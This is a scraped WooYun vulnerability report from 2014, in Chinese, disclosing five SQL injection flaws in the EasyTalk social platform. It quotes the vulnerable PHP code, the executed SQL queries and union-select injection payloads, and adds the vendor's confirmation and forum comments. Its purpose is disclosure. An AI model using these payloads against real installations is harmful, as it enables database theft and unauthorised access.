{"id": 4368, "wybug_id": "wooyun-2014-050338", "wybug_title": "EasyTalk Sql Injection 1-5", "wybug_corp": "nextsns.com", "wybug_author": "′雨。", "wybug_date": "2014-02-09 10:26", "wybug_open_date": "2014-05-10 10:27", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向公众公开  简要描述： 过滤不严。 详细说明：  注入1：在topicaction.class.php中\npublic function topic() {\t\t$keyword=$this->_get('keyword','urldecode');//无过滤 且解码\t\tif ($keyword) {\t\t\t$topic = D('Topic')->where(\"topicname='$keyword'\")->find();            if ($topic) {                $isfollow=D('Mytopic')->isfollow($topic['id'],$this->my['user_id']);                $topicusers=D('MytopicView')->where(\"topicid='$topic[id]'\")->order('id desc')->limit(9)->select();\t\t\t\t//getwidget\t\t\t\t$widget=M('Topicwidget')->where(\"topicid='$topic[id]'\")->order('`order` ASC')->select();\t\t\t\tif ($widget) {\t\t\t\t\tforeach ($widget as $val) {\t\t\t\t\t\t$topicwidget[$val['widgettype']][]=$val;\t\t\t\t\t}\t\t\t\t}\t\t\t\t$this->assign('topicwidget',$topicwidget);            } else {                $count=$isfollow=0;            }\n$topic = D('Topic')->where(\"topicname='$keyword'\")->find();这里  带入查询。where topicname='keyword';SELECT * FROM `et_topic` WHERE topicname='aaa' LIMIT 1构造一下 aaa' and 1=2 union select 1,2,3,user(),5 %23完美注入。\n\n注入2：在settingaction.class.php 中\npublic function doauth() {        $_authmsg=daddslashes($_GET['auth']);        $authmsg=base64_decode($_authmsg);        $tem=explode(\":\",$authmsg);        $send_id=$tem[0];        $user=M('Users');        $row = $user->field('mailadres,auth_email')->where(\"user_id='$send_id'\")->find();        if ($_authmsg==$row['auth_email']) {            $user->where(\"user_id='$send_id'\")->setField('auth_email',1);            setcookie('setok', json_encode(array('lang'=>L('mail6'),'ico'=>1)),0,'/');        } else {            setcookie('setok', json_encode(array('lang'=>L('mail7'),'ico'=>2)),0,'/');        }        header('location:'.SITE_URL.'/?m=setting&a=mailauth');    }\n$_authmsg  虽然用addslashes 进行处理后 但是 后面解码。所以 无视过滤。 然后切割成数组 数组的第一个 带入查询。$row = $user->field('mailadres,auth_email')->where(\"user_id='$send_id'\")->find();where user_id = '$send_id'完美注入。 无视Gpc首先编码一下 然后注入 SELECT `mailadres`,`auth_email` FROM `et_users` WHERE user_id='yu' union select user(),2#' LIMIT 1\n\n完美注入。注入3：在messageaction.class.php中。\npublic function show() {\t\t$uid=$_GET['uid'];\t\t$mes=M('Messages');\t\t$count = $mes->where(\"(senduid='\".$this->my['user_id'].\"' AND sendtouid='$uid') OR (senduid='$uid' AND sendtouid='\".$this->my['user_id'].\"')\")->count();\t\t$p= new Page($count,20);\t\t$page = $p->show('message/show/uid/'.$uid.'/p/',1,'action-for=\"stream\"');\t\t$data = D('MessagesView')->where(\"(senduid='\".$this->my['user_id'].\"' AND sendtouid='$uid') OR (senduid='$uid' AND sendtouid='\".$this->my['user_id'].\"')\")->order(\"message_id DESC\")->limit($p->firstRow.','.$p->listRows)->select();\n$uid 无过滤 直接带入了查询。$count = $mes->where(\"(senduid='\".$this->my['user_id'].\"' AND sendtouid='$uid') OR (senduid='$uid' AND sendtouid='\".$this->my['user_id'].\"')\")->count();SELECT COUNT(*) AS tp_count FROM `et_messages` WHERE (senduid='2' AND sendtouid='aaaa' AND sendtouid='2') LIMIT 1执行的sql  构造一下语句。\n\n有图有真相。注入4：在photoaction.class.php中\npublic function show() {\t\t$cid=$_GET['cid'];\t\t\t\t$content=D('ContentView')->where(\"content_id='$cid' AND FIND_IN_SET('p',filetype)\")->find();\t\tif (!$content) {\t\t\t$this->display('nophoto');\t\t\texit;\t\t}\t\t\t\t$cModel=M('Content');\t\t$count=$cModel->where(\"user_id='$content[user_id]' AND FIND_IN_SET('p',filetype)\")->count();\n$cid 无过滤 且直接带入了where(\"content_id='$cid' AND FIND_IN_SET('p',filetype)\")->find();content_id=$cidSELECT Content.content_id AS content_id,Content.content_body AS content_body,Content.posttime AS posttime,Content.type AS type,Content.filetype AS filetype,Content.retid AS retid,Content.replyid AS replyid,Content.replytimes AS replytimes,Content.zftimes AS zftimes,Content.pinbi AS pinbi,Content.zhiding AS zhiding,Content.praisetimes AS praisetimes,Plugins.name AS appname,Plugins.directory AS directory,Plugins.available AS available,Plugins.type AS apptype,Users.user_id AS user_id,Users.user_name AS user_name,Users.nickname AS nickname,Users.user_head AS user_head,Users.user_auth AS user_auth,Users.provinceid AS provinceid,Users.cityid AS cityid FROM et_content Content ignore index(replyid) LEFT JOIN et_plugins Plugins ON Content.type=Plugins.directory LEFT JOIN et_users Users ON Content.user_id=Users.user_id WHERE content_id='aaa' AND FIND_IN_SET('p',filetype) LIMIT 1这个是执行的语句 来构造一下语句。\n\n注入成功 有图有真相。注入5：在appaction.class.php中\npublic function applist() {\t\tparent::tologin();\t\timport(\"@.ORG.Page\");        C('PAGE_NUMBERS',10);\t\t$pvmodel=D('PluginsView');\t\t$keyword=trim(htmlspecialchars($_REQUEST['keyword']));\t\tif (!$keyword) {\t\t\t$count=M('Plugins')->where(\"available=1 AND (type='app' || type='api')\")->count();\t\t\t$p= new Page($count,20);\t\t\t$page = $p->show(\"?m=app&a=applist&p=\");\t\t\t$app=$pvmodel->where(\"available=1 AND (type='app' || type='api')\")->order(\"installs DESC\")->limit($p->firstRow.','.$p->listRows)->select();\t\t} else {\t\t\t$count=$pvmodel->where(\"name LIKE '%$keyword%' AND available=1 AND (type='app' || type='api')\")->count();\t\t\t$p= new Page($count,20);\t\t\t$page = $p->show(\"?m=app&a=applist&keyword=$keyword&p=\");\t\t\t$app=$pvmodel->where(\"name LIKE '%$keyword%' AND available=1 AND (type='app' || type='api')\")->order(\"installs DESC\")->limit($p->firstRow.','.$p->listRows)->select();\n$KEYWORD为 request 获取的 然后html实体 但是对注入的影响不大。如果keyword 为true的话就带入$count=$pvmodel->where(\"name LIKE '%$keyword%' AND available=1 AND (type='app' || type='api')\")->count();SELECT COUNT(*) AS tp_count FROM et_plugins Plugins LEFT JOIN et_users Users ON Plugins.appauthor=Users.user_id WHERE name LIKE '%yu%' AND available=1 AND (type='app' || type='api') LIMIT 1所执行的语句 构造一下\n\n注入成功 有图有真相   漏洞证明：     修复方案：  过滤呗。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-02-09 16:33 厂商回复： 正在修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-09 11:26 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @xsser 。我只能说我心碎了。 15个 给我弄成了三个合集啊啊。。    \n     2014-02-09 19:29 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  可以了，刷了那么多…    \n     2014-02-09 19:40 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @xsser报告队长，用诺基亚手机的UC浏览器点击洞主的号会跳转到乌云首页    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}